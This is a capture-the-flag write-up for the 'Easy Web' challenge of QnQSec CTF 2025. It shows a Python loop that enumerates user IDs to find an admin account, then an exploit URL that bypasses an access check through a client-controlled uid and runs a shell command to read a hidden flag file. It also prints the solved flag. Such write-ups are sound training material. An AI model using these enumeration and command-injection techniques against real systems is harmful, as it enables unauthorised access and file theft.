---
title: "Easy Web"
slug: qnqsec-2025-easy-web
excerpt: "IDOR vulnerability leading to command injection"
coverImage: "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800"
coverImageAlt: "Easy Web - QnQSec CTF 2025 writeup"
categories:
  - QnQSec CTF 2025
  - Web
  - IDOR
  - Command Injection
date: 2025-01-12
showToc: true
---

## Reconnaissance

### Analyzing the Dockerfile

```dockerfile
RUN mkdir -p /app/.hidden && \
    mv /app/flag.txt /app/.hidden/flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt
```

The flag is in `/app/.hidden/` with a randomized filename. We can use wildcards: `/app/.hidden/flag*`

### Exploring the Web Application

Found a `/profile` endpoint with a `uid` parameter. Testing `uid=1` returns a user, `uid=2` returns "not found".

## Finding the Admin User

I wrote a Python script to enumerate UIDs:

```python
for uid in range(1, 10000):
    response = requests.get(f'/profile?uid={uid}')
    if 'admin' in response.text.lower():
        print(f'Admin found with uid {uid}')
        break
```

Result: **Admin found with uid 1337**

## The Admin Portal

The admin portal at `/profile?uid=1337` has a link to an admin command interface with an input field (default: `whoami`) that outputs `nobody`.

This looks like command execution! However, trying to change commands returns "Access denied" because the form changes the UID to 2.

## Exploitation - IDOR

The vulnerability is clear:

1. The admin portal checks if `uid` has admin privileges
2. But the `uid` parameter is **client-controlled** via the URL
3. We can manually set `uid=1337` to bypass the check!

### Final Exploit URL

```
/admin?uid=1337&cmd=cat%20/app/.hidden/flag*
```

## Flag

```
QnQSec{I_f0und_th1s_1day_wh3n_I_am_using_sch00l_0j}
```
